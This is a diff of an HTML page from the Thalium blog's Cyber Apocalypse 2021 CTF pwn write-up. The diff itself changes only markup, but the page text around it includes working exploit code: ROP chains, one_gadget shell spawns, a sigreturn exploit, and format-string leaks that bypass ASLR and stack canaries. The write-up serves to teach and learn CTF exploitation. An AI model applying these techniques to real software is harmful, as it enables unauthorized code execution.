@@ -7,7 +7,7 @@
 <meta name="description" content="Thalium blog." />
 <meta name="keywords" content="blog, tech" />
 <meta name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1">
-<meta name="generator" content="Hugo 0.83.1" />
+<meta name="generator" content="Hugo 0.88.1" />
 
 <link rel="canonical" href="https://thalium.github.io/blog/posts/apocalypse2021-pwn/">
 <meta property="og:title" content="Cyber Apocalypse 2021 1/5 - PWN challenges" />
@@ -18,8 +18,8 @@ Our team finished in fifth place and solved sixty out of the sixty-two challenge
 This article explains how we solved each pwn challenge and what tools we used, it is written to be accessible to beginners:" />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://thalium.github.io/blog/posts/apocalypse2021-pwn/" /><meta property="article:section" content="posts" />
-<meta property="article:published_time" content="2021-04-28T12:00:00&#43;01:00" />
-<meta property="article:modified_time" content="2021-04-28T12:00:00&#43;01:00" />
+<meta property="article:published_time" content="2021-04-28T12:00:00+01:00" />
+<meta property="article:modified_time" content="2021-04-28T12:00:00+01:00" />
 
 
 <meta name="twitter:card" content="summary"/>
@@ -36,8 +36,8 @@ This article explains how we solved each pwn challenge and what tools we used, i
 It was a great success with 4,740 teams composed of around 10,000 hackers from all over the world.
 Our team finished in fifth place and solved sixty out of the sixty-two challenges:
 
-This article explains how we solved each pwn challenge and what tools we used, it is written to be accessible to beginners:"><meta itemprop="datePublished" content="2021-04-28T12:00:00&#43;01:00" />
-<meta itemprop="dateModified" content="2021-04-28T12:00:00&#43;01:00" />
+This article explains how we solved each pwn challenge and what tools we used, it is written to be accessible to beginners:"><meta itemprop="datePublished" content="2021-04-28T12:00:00+01:00" />
+<meta itemprop="dateModified" content="2021-04-28T12:00:00+01:00" />
 <meta itemprop="wordCount" content="4352">
 <meta itemprop="keywords" content="CTF,Writeup,CyberApocalypse2021," />
 
@@ -207,9 +207,9 @@ Our team finished in fifth place and solved sixty out of the sixty-two challenge
 </li>
 </ul>
 <p>Each challenge implements a specific communication scheme, thus, we have to adapt the content of the <code>exploit</code> function of the template to correctly interact with the binary, and leverage its vulnerabilities to retrieve the flag. To run the local binary without debugger the script must be used as follows:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">python script.py ./my_binary
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">python script.py ./my_binary
 </code></pre></div><p>To run the program with a debugger attached:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">python script.py ./my_binary -d
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">python script.py ./my_binary -d
 </code></pre></div><p>The most important thing is to run the binary with the target versions of dynamic linker and c runtime library. To ensure this:</p>
 <ul>
 <li>Download the <a href="https://thalium.github.io/blog/posts/binaries/Cyber_Apocalypse_2021/ld-linux-x86-64.so.zip">ld binary</a> provided</li>
@@ -217,17 +217,17 @@ Our team finished in fifth place and solved sixty out of the sixty-two challenge
 <li>Copy the libc provided by the challenge and rename it <code>libc-2.27.so</code></li>
 <li>Run the script whith the following parameters</li>
 </ul>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">python script.py ./my_binary -libc 2.27 
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">python script.py ./my_binary -libc 2.27 
 </code></pre></div><p>The version of library can be changed if needed but this is the version used for all pwn challenges - and misc close_the_door - during this ctf.</p>
 <p>Finally, to use the exploit against the remote infrastructure:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">python script.py ./environment -libc 2.27 -r <span style="color:#f92672">[</span>IP<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>PORT<span style="color:#f92672">]</span> 
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">python script.py ./environment -libc 2.27 -r <span style="color:#f92672">[</span>IP<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>PORT<span style="color:#f92672">]</span> 
 </code></pre></div><h2 id="controller---difficulty-14">Controller - Difficulty 1/4</h2>
 <p><em>Challenge files: <a href="https://thalium.github.io/blog/posts/binaries/Cyber_Apocalypse_2021/pwn_controller.zip">pwn_controller.zip</a></em></p>
 <p><code>Controller</code> is a <strong>64 bits ELF</strong>, which asks the user to choose a simple arithmetic operation and enter two operands. Numbers provided cannot be greater than 69.</p>
 <p><img src="https://thalium.github.io/blog/posts/img/Cyber_Apocalypse_2021-controller.png" alt="fig_controller"></p>
 <h3 id="attack-method">Attack method</h3>
 <p>We notice an interesting function, <code>calculator</code>:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">__int64</span> <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">calculator</span>(<span style="color:#66d9ef">__int64</span> a1)
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">__int64</span> <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">calculator</span>(<span style="color:#66d9ef">__int64</span> a1)
 {
   <span style="color:#66d9ef">__int64</span> result; <span style="color:#75715e">// rax
 </span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> buff[<span style="color:#ae81ff">28</span>]; <span style="color:#75715e">// [rsp+0h] [rbp-20h] BYREF
@@ -246,14 +246,14 @@ Our team finished in fifth place and solved sixty out of the sixty-two challenge
 <p><img src="https://thalium.github.io/blog/posts/img/Cyber_Apocalypse_2021-controller_calc.png" alt="fig_controller_good_calculation"></p>
 <h4 id="exploit-the-stack-overflow-with-scanf">Exploit the stack overflow with scanf</h4>
 <p>Now we can access the scanf and overflow the stack. Protections are as follows:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#e6db74">&#39;controller&#39;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#e6db74">&#39;controller&#39;</span>
     Arch:     amd64-64-little
     RELRO:    Full RELRO
     Stack:    No canary found
     NX:       NX enabled
     PIE:      No PIE <span style="color:#f92672">(</span>0x400000<span style="color:#f92672">)</span>
 </code></pre></div><p>No PIE and No canary found: we will build a ropchain. There is no magic / hidden function inside the binary, so we use <code>one_gadget</code> to list available automatic shell gadgets and their constraints:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#ae81ff">0x4f3d5</span> execve(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>, rsp<span style="color:#f92672">+</span><span style="color:#ae81ff">0x40</span>, environ)
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#ae81ff">0x4f3d5</span> execve(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>, rsp<span style="color:#f92672">+</span><span style="color:#ae81ff">0x40</span>, environ)
 constraints:
   rsp <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xf</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>
   rcx <span style="color:#f92672">==</span> NULL
@@ -274,9 +274,9 @@ The ROP payload will then call this address.</p>
 <h4 id="1-leak-the-libc-address">1. Leak the libc address</h4>
 <p>We use the <code>puts</code> function present inside <code>controller</code> to leak the libc address of the <code>printf</code> function.</p>
 <p>Using ROPGadget we found the following one to set the put parameter in place:</p>
-<pre><code>0x00000000004011d3 : pop rdi ; ret
+<pre tabindex="0"><code>0x00000000004011d3 : pop rdi ; ret
 </code></pre><p>So the ROP part for this section is:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">gadget_pop_rdi     <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4011d3</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">gadget_pop_rdi     <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4011d3</span>
 
 <span style="color:#75715e"># Set parameters before call puts</span>
 ropchain <span style="color:#f92672">+=</span> p64(gadget_pop_rdi) <span style="color:#f92672">+</span> p64(elf<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#39;printf&#39;</span>])
@@ -285,13 +285,13 @@ ropchain <span style="color:#f92672">+=</span> p64(elf<span style="color:#f92672
 </code></pre></div><h4 id="2-recall-scanf-after-the-leak">2. Recall scanf after the leak</h4>
 <p>We must pass two parameters to <code>scanf</code>. The first one is the format, and the second one is the address of the destination buffer that will be filled by <code>scanf</code> according to the format string.</p>
 <p>We used the format string <code>%s</code> present inside the controller binary:</p>
-<pre><code>.rodata:00000000004013E6 aS              db '%s',0 
+<pre tabindex="0"><code>.rodata:00000000004013E6 aS              db '%s',0 
 </code></pre><p>We choose a writable memory address to be filled with the one gadget addr: <code>0x602100</code>. We load this address into <code>rsi</code> with the new gadget:</p>
-<pre><code>0x00000000004011d1 : pop rsi ; pop r15 ; ret
+<pre tabindex="0"><code>0x00000000004011d1 : pop rsi ; pop r15 ; ret
 </code></pre><p>There is still a problem. If the stack is not aligned during the <code>scanf</code> call, a crash happens because <code>scanf</code> uses xmm registers. Aligning the stack is not terribly difficult, one simply has to add a useless <code>ret</code>, which subtracts eight bytes from <code>rsp</code> before calling <code>scanf</code>:</p>
-<pre><code>0x0000000000400606 : ret
+<pre tabindex="0"><code>0x0000000000400606 : ret
 </code></pre><p>The ROP part for this section is:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">gadget_pop_rsi_r15 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4011d1</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">gadget_pop_rsi_r15 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4011d1</span>
 gadget_ret         <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x400606</span>
 format_string_s    <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4013E6</span>
 target_addr        <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x602100</span>
@@ -305,11 +305,11 @@ ropchain <span style="color:#f92672">+=</span> p64(gadget_ret)
 ropchain <span style="color:#f92672">+=</span> p64(elf<span style="color:#f92672">.</span>plt[<span style="color:#e6db74">&#39;__isoc99_scanf&#39;</span>])
 </code></pre></div><h4 id="3-call-the-one-gadget">3. Call the one gadget</h4>
 <p>The following gadget allow to do an indirect call:</p>
-<pre><code>0x00000000004011b0: mov rdx, r15; mov rsi, r14; mov edi, r13d; call [r12+8*rbx]
+<pre tabindex="0"><code>0x00000000004011b0: mov rdx, r15; mov rsi, r14; mov edi, r13d; call [r12+8*rbx]
 </code></pre><p>We must master registers r12 and rbx to call the one gadget function. The last gadget allow us to do that:</p>
-<pre><code>0x00000000004011ca: pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
+<pre tabindex="0"><code>0x00000000004011ca: pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
 </code></pre><p>The ROP part for this section is:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">gadget_pop_rbx_      <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4011ca</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">gadget_pop_rbx_      <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4011ca</span>
 gadget_indirect_call <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4011b0</span>
 
 <span style="color:#75715e"># Set value to registers</span>
@@ -319,7 +319,7 @@ ropchain <span style="color:#f92672">+=</span> p64(gadget_pop_rbx_) <span style=
 ropchain <span style="color:#f92672">+=</span> p64(gadget_indirect_call)
 </code></pre></div><h4 id="4-put-it-all-together">4. Put it all together</h4>
 <p>This is the final payload to exploit this binary used with the base script:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> time
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> time
 <span style="color:#f92672">from</span> struct <span style="color:#f92672">import</span> unpack
 
 <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_ropchain</span>(elf):
@@ -397,15 +397,15 @@ ropchain <span style="color:#f92672">+=</span> p64(gadget_indirect_call)
         x <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>
     
     leak <span style="color:#f92672">=</span> unpack(<span style="color:#e6db74">&#39;Q&#39;</span>, x)[<span style="color:#ae81ff">0</span>]
-    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;leak printf@0x</span><span style="color:#e6db74">%x</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> leak)
+    print(<span style="color:#e6db74">&#39;leak printf@0x</span><span style="color:#e6db74">%x</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> leak)
 
     libc_base <span style="color:#f92672">=</span> leak <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;printf&#39;</span>]
-    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;leak libc@0x</span><span style="color:#e6db74">%x</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> libc_base)
+    print(<span style="color:#e6db74">&#39;leak libc@0x</span><span style="color:#e6db74">%x</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> libc_base)
 
     <span style="color:#75715e"># Send one gadget inside the new scanf call</span>
 
     one_gadget <span style="color:#f92672">=</span> libc_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x4f432</span> 
-    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;one_gadget @0x</span><span style="color:#e6db74">%x</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> one_gadget)
+    print(<span style="color:#e6db74">&#39;one_gadget @0x</span><span style="color:#e6db74">%x</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> one_gadget)
 
     p<span style="color:#f92672">.</span>sendline(p64(one_gadget))
 
@@ -419,7 +419,7 @@ ropchain <span style="color:#f92672">+=</span> p64(gadget_indirect_call)
 <p><img src="https://thalium.github.io/blog/posts/img/Cyber_Apocalypse_2021-minefield.png" alt="fig_controller_minefield"></p>
 <h3 id="attack-method-1">Attack method</h3>
 <p>This challenge is a very basic one. The inputs <strong>type</strong> and <strong>location</strong> allow to write something at a controlled address:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">printf(<span style="color:#e6db74">&#34;Insert type of mine: &#34;</span>);
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">printf(<span style="color:#e6db74">&#34;Insert type of mine: &#34;</span>);
 r(nptr);
 target_addr <span style="color:#f92672">=</span> (_QWORD <span style="color:#f92672">*</span>)strtoull(nptr, <span style="color:#ae81ff">0LL</span>, <span style="color:#ae81ff">0</span>);
 printf(<span style="color:#e6db74">&#34;Insert location to plant: &#34;</span>);
@@ -427,13 +427,13 @@ r(target_value);
 puts(<span style="color:#e6db74">&#34;We need to get out of here as soon as possible. Run!&#34;</span>);
 <span style="color:#f92672">*</span>target_addr <span style="color:#f92672">=</span> strtoull(target_value, <span style="color:#ae81ff">0LL</span>, <span style="color:#ae81ff">0</span>);
 </code></pre></div><p>We do not have the libc for this challenge but we have a win function named <code>_</code> at address <code>0x40096B</code></p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">v0 <span style="color:#f92672">=</span> strlen(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Mission accomplished! ✔</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">v0 <span style="color:#f92672">=</span> strlen(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Mission accomplished! ✔</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
 write(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Mission accomplished! ✔</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, v0);
 system(<span style="color:#e6db74">&#34;cat flag*&#34;</span>);
 </code></pre></div><p>Note that the same write-what-where vulnerability is used in the challenge <a href="#save-the-environment---difficulty-24">Save the environment</a>.</p>
 <h3 id="exploitation-1">Exploitation</h3>
 <p>Protections are as follow:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#e6db74">&#39;minefield&#39;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#e6db74">&#39;minefield&#39;</span>
     Arch:     amd64-64-little
     RELRO:    No RELRO
     Stack:    Canary found
@@ -445,7 +445,7 @@ system(<span style="color:#e6db74">&#34;cat flag*&#34;</span>);
 <p><img src="https://thalium.github.io/blog/posts/img/Cyber_Apocalypse_2021-minefield_exploit.png" alt="fig_controller_minefield"></p>
 <h2 id="system-drop---difficulty-14">System dROP - Difficulty 1/4</h2>
 <p><em>Challenge files: <a href="https://thalium.github.io/blog/posts/binaries/Cyber_Apocalypse_2021/pwn_system_drop.zip">pwn_system_drop.zip</a></em></p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#e6db74">&#39;/home/user/Apocalypse/system-drop/system_drop&#39;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#e6db74">&#39;/home/user/Apocalypse/system-drop/system_drop&#39;</span>
     Arch:     amd64-64-little
     RELRO:    Partial RELRO
     Stack:    No canary found
@@ -453,7 +453,7 @@ system(<span style="color:#e6db74">&#34;cat flag*&#34;</span>);
     PIE:      No PIE <span style="color:#f92672">(</span>0x400000<span style="color:#f92672">)</span>
 </code></pre></div><p><code>No PIE</code> and <code>No canary found</code> suggest a stack overflow. However the binary is <em>very</em> small.</p>
 <h3 id="the-vulnerability">The vulnerability</h3>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__cdecl</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>envp)
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__cdecl</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>envp)
 {
   <span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">32</span>]; <span style="color:#75715e">// [rsp+0h] [rbp-20h] BYREF
 </span><span style="color:#75715e"></span>
@@ -464,7 +464,7 @@ system(<span style="color:#e6db74">&#34;cat flag*&#34;</span>);
 </code></pre></div><p>A stack overflow, clear and simple.</p>
 <h3 id="attack-method-2">Attack method</h3>
 <p>However, the binary is small and does not have any leak-friendly function.</p>
-<pre><code>.text:0000000000400537 ; =============== S U B R O U T I N E ==================
+<pre tabindex="0"><code>.text:0000000000400537 ; =============== S U B R O U T I N E ==================
 .text:0000000000400537
 .text:0000000000400537 ; Attributes: bp-based frame
 .text:0000000000400537
@@ -514,7 +514,7 @@ system(<span style="color:#e6db74">&#34;cat flag*&#34;</span>);
 </code></pre><p>The function at <code>0x400537</code> is a gift ! We have a raw syscall instruction. However, to have control over the syscall, we first need to control <code>rax</code>, and no gadget allows us to control <code>rax</code> trivially, apart from <code>0x400569</code> which allows to set <code>eax=1</code>.</p>
 <p><code>sigreturn</code> is a nice system call in this case, which will read cpu context from the stack, consequently allowing us to control all the registers. The syscall number associated with it is <code>0xf</code>. So we are looking at setting <code>eax=0xf</code>.</p>
 <p>Reading the alarm manpage is rather interesting:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">ALARM(<span style="color:#ae81ff">2</span>)                   Linux Programmer<span style="color:#960050;background-color:#1e0010">&#39;</span>s Manual                  ALARM(<span style="color:#ae81ff">2</span>)
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">ALARM(<span style="color:#ae81ff">2</span>)                   Linux Programmer<span style="color:#960050;background-color:#1e0010">&#39;</span>s Manual                  ALARM(<span style="color:#ae81ff">2</span>)
 
 NAME
        alarm <span style="color:#f92672">-</span> set an alarm clock <span style="color:#66d9ef">for</span> delivery of a signal
@@ -526,7 +526,7 @@ RETURN VALUE
 ...
 </code></pre></div><p>For this challenge, calling <code>alarm()</code> will set the alarm to fire later, and a nice side-effect, will also set <code>eax</code> to the remaining number of seconds until the scheduled alarm fires. Thus calling <code>alarm()</code> sets <code>eax=0xf</code>, which is what we wanted.</p>
 <p>We will go for a <code>sigreturn</code>, and cook the stack for it to work correctly:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> SigreturnFrame, constants
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> SigreturnFrame, constants
 <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exploit</span>(p, elf, libc):
 	stack_base <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x601800</span>  
 
@@ -583,7 +583,7 @@ RETURN VALUE
 <p>The libc used by the binary is provided with this challenge.</p>
 <h3 id="attack-method-3">Attack method</h3>
 <p>Protections are as follow:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#e6db74">&#39;harvester&#39;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#e6db74">&#39;harvester&#39;</span>
     Arch:     amd64-64-little
     RELRO:    Full RELRO
     Stack:    Canary found
@@ -591,7 +591,7 @@ RETURN VALUE
     PIE:      PIE enabled
 </code></pre></div><h4 id="harvest-information-required-to-bypass-aslr-and-stack-cookie">Harvest information required to bypass ASLR and stack cookie</h4>
 <p>We will use the format string vulnerability in <code>fight</code>:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">printstr(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Choose weapon:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">printstr(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Choose weapon:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
 printstr(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">[1] 🗡</span><span style="color:#ae81ff">\t\t</span><span style="color:#e6db74">[2] 💣</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">[3] 🏹</span><span style="color:#ae81ff">\t\t</span><span style="color:#e6db74">[4] 🔫</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&gt; &#34;</span>);
 read(<span style="color:#ae81ff">0</span>, weapon, <span style="color:#ae81ff">5uLL</span>);
 printstr(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Your choice is: &#34;</span>); 
@@ -600,7 +600,7 @@ printf((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</s
 <li><code>%3$p</code>: will leak a libc address, thereby bypassing libc ASLR</li>
 <li><code>%15$p</code>: will leak the stack cookie, thereby bypassing stack protection</li>
 </ul>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>)
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>)
     p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>)
 
     p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>)
@@ -626,7 +626,7 @@ printf((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</s
     cookie <span style="color:#f92672">=</span> int(m<span style="color:#f92672">.</span>group(<span style="color:#ae81ff">1</span>), <span style="color:#ae81ff">0</span>)
 </code></pre></div><h4 id="stack-overflow">Stack overflow</h4>
 <p>There is a stack overflow in <code>stare</code>, however, to trigger it we need to have 22 pies:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">// stare
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">// stare
 </span><span style="color:#75715e"></span><span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">40</span>]; <span style="color:#75715e">// [rsp+0h] [rbp-30h] BYREF
 </span><span style="color:#75715e"></span>
 [...]
@@ -641,7 +641,7 @@ printstr(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n<
